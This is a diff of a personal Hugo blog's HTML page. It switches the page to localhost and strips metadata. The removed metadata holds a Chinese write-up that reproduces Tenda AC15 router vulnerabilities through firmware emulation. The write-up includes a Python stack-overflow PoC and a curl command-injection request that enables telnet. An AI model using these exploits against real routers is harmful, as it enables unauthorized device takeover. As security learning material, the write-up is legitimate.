@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="zh" dir="auto" data-theme="auto">
 
-<head><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
+<meta name="robots" content="noindex, nofollow">
 <title>Tenda AC15漏洞复现 | 南行&#39;s Blog</title>
 <meta name="keywords" content="">
 <meta name="description" content="前言
@@ -14,16 +14,16 @@
 
 解压下载的压缩包就可以拿到固件">
 <meta name="author" content="">
-<link rel="canonical" href="https://nanhang.top/posts/iot/tenda/">
+<link rel="canonical" href="http://localhost:1313/posts/iot/tenda/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.06b120a65aeb9368e0ceaf40b7f104e3773d33d49b58d97f1c5e76995fbc7718.css" integrity="sha256-BrEgplrrk2jgzq9At/EE43c9M9SbWNl/HF52mV&#43;8dxg=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://nanhang.top/assets/favicon.jpg">
-<link rel="icon" type="image/png" sizes="16x16" href="https://nanhang.top/assets/favicon.jpg">
-<link rel="icon" type="image/png" sizes="32x32" href="https://nanhang.top/assets/favicon.jpg">
-<link rel="apple-touch-icon" href="https://nanhang.top/assets/favicon.jpg">
-<link rel="mask-icon" href="https://nanhang.top/assets/favicon.jpg">
+<link rel="icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/assets/favicon.jpg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="zh" href="https://nanhang.top/posts/iot/tenda/">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/iot/tenda/">
 <noscript>
     <style>
         #theme-toggle,
@@ -109,81 +109,13 @@ code.has-jax {
     border: inherit;
     color: #515151;
 }
-</style><meta property="og:url" content="https://nanhang.top/posts/iot/tenda/">
-  <meta property="og:site_name" content="南行&#39;s Blog">
-  <meta property="og:title" content="Tenda AC15漏洞复现">
-  <meta property="og:description" content="前言 基于 “学习漏洞挖掘最好的方法就是复现漏洞本身。” 的思想，所以选择复现 Tenda AC15 的几个漏洞来学习 IOT 漏洞挖掘。
-获取固件 从官网下载固件：AC15升级软件_腾达(Tenda)官方网站 解压下载的压缩包就可以拿到固件">
-  <meta property="og:locale" content="zh">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-11-30T23:30:38+00:00">
-    <meta property="article:modified_time" content="2025-11-30T23:30:38+00:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tenda AC15漏洞复现">
-<meta name="twitter:description" content="前言
-基于 “学习漏洞挖掘最好的方法就是复现漏洞本身。” 的思想，所以选择复现 Tenda AC15 的几个漏洞来学习 IOT 漏洞挖掘。
-获取固件
-从官网下载固件：AC15升级软件_腾达(Tenda)官方网站
-
-解压下载的压缩包就可以拿到固件">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://nanhang.top/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "Tenda AC15漏洞复现",
-      "item": "https://nanhang.top/posts/iot/tenda/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "Tenda AC15漏洞复现",
-  "name": "Tenda AC15漏洞复现",
-  "description": "前言 基于 “学习漏洞挖掘最好的方法就是复现漏洞本身。” 的思想，所以选择复现 Tenda AC15 的几个漏洞来学习 IOT 漏洞挖掘。\n获取固件 从官网下载固件：AC15升级软件_腾达(Tenda)官方网站 解压下载的压缩包就可以拿到固件\n",
-  "keywords": [
-    
-  ],
-  "articleBody": "前言 基于 “学习漏洞挖掘最好的方法就是复现漏洞本身。” 的思想，所以选择复现 Tenda AC15 的几个漏洞来学习 IOT 漏洞挖掘。\n获取固件 从官网下载固件：AC15升级软件_腾达(Tenda)官方网站 解压下载的压缩包就可以拿到固件\n❯ unzip ./US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip ❯ ls US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin 固件分析 接下来我们就可以进行固件的分析，首先我们要解包固件。\n解包固件 通过binwalk -Me解包固件。\n解包后得到的目录\n通过tree命令快速定位到我们解包固件后获取到的文件系统squashfs-root目录。\n然后我们就可以进一步分析。\n信息搜集 分析固件存在哪些服务，这里我们先通过 Firmwalker 和 Trommel 工具扫一下。\nFirmwalker 是一个简单的 Bash 脚本，用于分析已提取或已挂载的固件文件系统。它主要用于查找固件中的潜在安全隐患和敏感信息，帮助安全研究人员快速识别设备中的问题。\nTrommel 是一个用于分析嵌入式设备文件的工具，旨在通过识别潜在的易受攻击的指示器来帮助安全研究人员发现设备中的漏洞。它可以在固件分析过程中自动检测多种安全隐患，并帮助安全人员对固件中的敏感信息进行识别。\nFirmwalker 分析固件：\n./firmwalker.sh squashfs-root ../firmwalker.txt Firmwalker 会在固件的文件系统中搜索以下内容：系统账户文件、SSL证书和相关文件、配置文件、脚本文件、其它二进制文件、关键词搜索、常见的IOT服务和软件、URL、电子邮件和 IP 地址。\n它会将分析结果生成为 firmwalker.txt 文件。\nFirmwalker 的分析结果：\n结果近4000行，就不全部展示了。\nTROMMEL 分析固件：\ntrommel.py -p squashfs-roo -o results_output_file -d TROMMEL 主要识别以下与潜在安全漏洞相关的指标：SSH 密钥文件、SSL 密钥文件、IP 地址、URL、电子邮件地址、Shell 脚本、Web 服务器二进制文件、配置文件、数据库文件、特定二进制文件、共享库文件、Web 应用脚本变量 、Android 应用包（APK）权限。\nTrommel 的分析结果：\n这个文件更大，有9000行。\n启动项分析 然后我们分析init.d目录下的文件，它一般在etc或以etc开头的目录下，这个目录通常与系统的初始化和启动过程相关。\n在我们当前固件的目录下只存在一个文件，接下来我们分析这个文件来查看固件启动时做了什么。\n❯ ls etc_ro/init.d rcS rcS #! /bin/sh PATH=/sbin:/bin:/usr/sbin:/usr/bin/ export PATH mount -t ramfs none /var/ mkdir -p /var/etc mkdir -p /var/media mkdir -p /var/webroot mkdir -p /var/etc/iproute mkdir -p /var/run cp -rf /etc_ro/* /etc/ cp -rf /webroot_ro/* /webroot/ mkdir -p /var/etc/upan mount -a mount -t ramfs /dev mkdir /dev/pts mount -t devpts devpts /dev/pts mount -t tmpfs none /var/etc/upan -o size=2M mdev -s mkdir /var/run #mount -t jffs2 /dev/mtdblock7 /cfg echo '/sbin/mdev' \u003e /proc/sys/kernel/hotplug #echo 'sd[a-z][0-9] 0:0 0660 @/usr/sbin/autoUsb.sh $MDEV' \u003e\u003e /etc/mdev.conf #echo 'sd[a-z] 0:0 0660 $/usr/sbin/DelUsb.sh $MDEV' \u003e\u003e /etc/mdev.conf #echo 'lp[0-9] 0:0 0660 */usr/sbin/IppPrint.sh'\u003e\u003e /etc/mdev.conf #wds rule start echo 'wds*.* 0:0 0660 */etc/wds.sh $ACTION $INTERFACE' \u003e /etc/mdev.conf #wsd rule end echo 'sd[a-z][0-9] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH' \u003e\u003e /etc/mdev.conf echo '-sd[a-z] 0:0 0660 $/usr/sbin/usb_down.sh $MDEV $DEVPATH'\u003e\u003e /etc/mdev.conf echo 'sd[a-z] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH'\u003e\u003e /etc/mdev.conf echo '.* 0:0 0660 */usr/sbin/IppPrint.sh $ACTION $INTERFACE'\u003e\u003e /etc/mdev.conf #echo '115.159.183.96 cloud.tenda.com.cn' \u003e\u003e /etc/hosts mkdir -p /var/ppp insmod /lib/modules/fastnat.ko insmod /lib/modules/bm.ko #insmod /lib/modules/ai.ko insmod /lib/modules/mac_filter.ko #insmod /lib/modules/ip_mac_bind.ko insmod /lib/modules/privilege_ip.ko insmod /lib/modules/qos.ko insmod /lib/modules/url_filter.ko insmod /lib/modules/loadbalance.ko echo \"0 0 0 0\"\u003e/proc/sys/kernel/printk #insmod /lib/modules/app_filter.ko #insmod /lib/modules/port_filter.ko #insmod /lib/modules/arp_fence.ko #insmod /lib/modules/ddos_ip_fence.ko insmod /lib/modules/jnl.ko insmod /lib/modules/ufsd.ko insmod /lib/modules/fastnat_configure.ko chmod +x /etc/mdev.conf cfmd \u0026 echo '' \u003e /proc/sys/kernel/hotplug udevd \u0026 logserver \u0026 tendaupload \u0026 if [ -e /etc/nginx/conf/nginx_init.sh ]; then sh /etc/nginx/conf/nginx_init.sh fi moniter \u0026 telnetd \u0026 这是一个 shell 文件，做了很多初始化和配置，接下来我们就拣主要的说。\n创建/var/etc、/var/media、/var/webroot、/var/etc/iproute、/var/run等目录 将/etc_ro/目录下的所有文件复制到/etc/目录 将/webroot_ro目录下的所有文件复制到/webroot目录 如果/etc/nginx/conf/nginx_init.sh 文件存在，则执行它 启动 telnetd 服务 综合分析 综合信息收集的结果和初始化文件的信息，判断目标固件存在以下服务：\nWeb： 程序文件：/bin/httpd 配置文件：/etc_ro/nginx/conf/nginx.conf FTP： 程序文件：/bin/httpd 配置文件：/etc_ro/vsftpd.conf Samba： 程序文件：/usr/sbin/smbd 配置文件：/etc_ro/smb.conf Telnet： 程序文件：/usr/sbin/telnetd PPP： 程序文件：/bin/pppd minidlna： 程序文件：/bin/minidlna 根据分析的结果我们就可以进一步分析可能存在漏洞的地方。\n分析 httpd 是否存在二进制漏洞 分析服务配置是否存在逻辑漏洞 我们这里进行漏洞复现，主要复现的就是 httpd 中存在的二进制漏洞。\n下面我们就要研究如何进行固件模拟。\n固件模拟 对 httpd 进行固件模拟，首先我们知道查看 httpd 是什么架构的二进制文件。\nfile 查看发现 httpd 为 arm 32位小端序，这样我们就需要模拟一个 arm 32位小端序的可执行环境来模拟固件。\n模拟固件可以通过 qemu 或 qiling 框架来进行模拟，这里我们就直接选择 qemu 来模拟。\n我们首先复制 qemu-arm-static 到当前目录\ncp /usr/bin/qemu-arm-static ./ 然后通过以下命令模拟文件。\nchroot . ./qemu-arm-static ./bin/httpd chroot是一种改变进程根目录的命令，它将进程的工作目录限制为指定的目录。在这里，chroot . 将当前目录（也就是固件的根目录）作为新的根文件系统挂载点，从而模拟固件的执行环境。\n这里我们模拟之后发现程序直接卡在这里了，这样我们就需要逆向程序分析为什么会卡在那里。\n通过 ida 逆向分析，然后通过Welcome to ...字符串定位程序卡住的地方。\n定位到代码位置。\n在字符串上条指令打个断点，然后动态调试分析程序。\n通过 qemu 的-g参数开启调试模式模拟程序。\n然后通过 ida 连接进行动态调试\n启动调试后直接 F9 运行到断点处，然后单步调试分析。\n经过反复调试后我们发现程序卡在了这个sleep函数这里，它不断的跳转到loc_2E504然后loc_2E504又跳转到它。\n这里我们需要程序执行下去可以通过 patch 的方式，就是对程序进行修改，这里我们可以直接修改BGT指令（判断标志位是否为N=0和Z=0）。\n而很明显我们这里的条件是不满足的，所以我们可以BGT指令修改为B指令（无条件跳转）。\n通过 keypatch 插件修改：\n这里需要先把调试停下。\n修改后。\n然后保存修改到文件。\n点击 Apply patches to input file…\n然后点击 OK 即可。\n再次进行模拟，这次卡在了一个新的地方。\nhttpd 监听了 ip 255.255.255.255 的 80 端口。但是这个 ip 地址根本不可以使用，所以我们需要找到修改它的方法。\n根据listen ip字符串进行定位。\n交叉引用发现程序使用了一个inet_ntoa函数处理s.sa_data[2]这个值，处理结果就是 ip 地址。\n这里直接问 GPT inet_ntoa函数的作用。\n这里我们知道了inet_ntoa函数的作用，接下来我们需要知道参数是哪里来的，怎么控制参数才是影响 ip 地址值的关键。\n交叉引入发现参数s.sa_data[2]的几个操作处：\n发现对s.sa_data[2]赋值的操作是inet_addr(a1)，所以我们需要知道inet_addr函数的作用。\n再次询问 GPT：\n所以这里控制 ip 值变量就是inet_addr函数的变量a1，a1变量是当前函数的第一个参数。\n所以我们交叉引入当前函数，观察函数的第一个参数传递的内容。\n然后交叉引用v8变量，发现影响它的值的是g_lan_ip。\ng_lan_ip是一个未初始化的全局变量，所以我们交叉引入找到对它进行赋值的地方。\n找到了strcpy函数对g_lan_ip存在赋值操作，分析这里的代码。\n通过 GPT 分析一下，发现getLanIfName函数是获取局域网接口名称（如eth0），然后赋值给LanIfName。getIfIp获取该接口的 ip 地址将结果保存在v18。如果返回值小于零则表示失败，否则则将v18复制到g_lan_ip。\n这里我们需要分析getLanIfName函数的具体实现，它是一个库函数所以我们需要去so文件中寻找。\n首先分析libcommon.so文件，直接在导出表中搜索函数名。\n定位到getLanIfName函数，发现它只是调用了一个get_eth_name函数并且传递了参数 0。\n跟进分析发现get_eth_name函数也是一个库函数。\n搜索get_eth_name函数的实现so文件。\n分析libChipApi.so文件，同样通过导出表定位到get_eth_name函数。\n分析发现，get_eth_name函数通过传入的参数返回相应的接口名称。由于getLanIfName函数传递的参数是 0，所以我们返回的网卡名称是br0。所以我们只需要设置br0网卡 ip 地址既可以设置 httpd 绑定的 ip 地址。\n# 创建 br0 网桥接口 sudo ip link add name br0 type bridge # 启用 br0 接口 sudo ip link set dev br0 up # 给 br0 设置 IP 地址 sudo ip addr add 192.168.0.1/24 dev br0 这样我们的 httpd 就会绑定到 ip 192.168.0.1，然后我们将webroot_ro文件夹的内容复制到webroot中，这里是因为rcS初始化脚本中有这样的操作。\n之后我们就可以再次进行固件模拟，之后在浏览器输入 192.168.0.1 既可以访问 web 服务。\n漏洞复现 根据大佬的思路，在 httpd 类程序开发的时候往往会直接定义所有需要使用的函数。我们可以通过对常用逻辑的函数如包含Get字段的函数进行交叉引用，找到以下定义函数的地方：\n在审计程序时要重点关注 set 类型的函数，它们往往用于接收前端的数据，进行设置操作。\n在 IOT 漏洞挖掘中最常见的漏洞二进制漏洞就是栈溢出漏洞和命令注入漏洞。寻找这两种的漏洞有着不同的方法：\n栈溢出：关注进行输入数据操作的函数，如：strcpy、sprintf等。 命令注入：关注和执行命令有关的函数，如：system、execve等。 除以上函数之外，还会有很多经过包装的自定义函数。不过，这个只需要结合上下文进行识别即可。\n栈溢出 CVE-2025-25634：Tenda AC15 15.03.05.19版本存在安全漏洞，该漏洞源于参数src处理不当，导致基于栈的缓冲区溢出。\n目标缓冲区s大小为 596 字节，程序通过strcpy将数据复制到缓冲区s。并没有对源数据src做任何检查，所以如果复制超出目标大小的数据就会导致栈溢出。\npoc import requests def create_payload(): return b\"A\" * 51200 + b\"\\xef\\xbe\\xad\\xde\" def send_payload(url, payload): response = requests.get(url, params={'mac': payload}) print(f\"Response status code: {response.status_code}\\nResponse body: {response.text}\") if __name__ == \"__main__\": send_payload(\"http://192.168.0.1/goform/GetParentControlInfo\", create_payload()) 复现：\n命令注入 CVE-2025-25632：在 AC15v1.0 V15.03.05.19 设备中发现问题。/goform/telnet 路由的处理程序函数中的 HTTP 请求。这可能导致 Shell 元字符。\n典型的命令注入漏洞，在通过doSystemCmd函数拼接命令执行时没有做任何限制，所以我们可以设置本机的 IP 地址开启 telnet 服务。\npoc curl -i -X POST http://192.168.0.1/goform/telnet -d aa=aa --cookie \"user=admin\" --http0.9 telnet 192.168.0.1 80 复现：\n参考 Tenda AC15 固件模拟与漏洞复现 - IOTsec-Zone\n",
-  "wordCount" : "3920",
-  "inLanguage": "zh",
-  "datePublished": "2025-11-30T23:30:38Z",
-  "dateModified": "2025-11-30T23:30:38Z",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://nanhang.top/posts/iot/tenda/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "南行's Blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://nanhang.top/assets/favicon.jpg"
-    }
-  }
-}
-</script>
+</style>
 </head>
 <body id="top">
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://nanhang.top/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
+            <a href="http://localhost:1313/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -209,32 +141,32 @@ code.has-jax {
         </div>
         <ul id="menu">
             <li>
-                <a href="https://nanhang.top/" title="南行&#39;s Blog">
+                <a href="http://localhost:1313/" title="南行&#39;s Blog">
                     <span>首页</span>
                 </a>
             </li>
             <li>
-                <a href="https://nanhang.top/archives/" title="归档">
+                <a href="http://localhost:1313/archives/" title="归档">
                     <span>归档</span>
                 </a>
             </li>
             <li>
-                <a href="https://nanhang.top/categories/" title="Categories">
+                <a href="http://localhost:1313/categories/" title="Categories">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="https://nanhang.top/tags/" title="Tags">
+                <a href="http://localhost:1313/tags/" title="Tags">
                     <span>标签</span>
                 </a>
             </li>
             <li>
-                <a href="https://nanhang.top/search/" title="搜索">
+                <a href="http://localhost:1313/search/" title="搜索">
                     <span>搜索</span>
                 </a>
             </li>
             <li>
-                <a href="https://nanhang.top/about/" title="About">
+                <a href="http://localhost:1313/about/" title="About">
                     <span>关于</span>
                 </a>
             </li>
